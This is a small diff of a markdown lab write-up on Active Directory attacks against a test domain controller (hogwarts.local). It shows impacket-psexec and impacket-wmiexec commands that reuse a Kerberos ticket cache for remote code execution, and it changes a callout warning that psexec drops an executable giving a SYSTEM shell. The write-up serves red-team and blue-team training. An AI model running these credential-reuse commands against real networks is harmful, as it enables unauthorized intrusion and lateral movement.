@@ -169,7 +169,7 @@ export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -ta
 export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
 export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
 ```
-> [!NOTE]  
+> [!CAUTION]  
 > Be careful when using impacket-psexec. Because this command creates a random 8-character named exe file,which gives the system shell by token impersonating, in the ADMIN$ share. This exe file is considered malicious by AVs and EDRs.
 
 ## Blue Team Activity
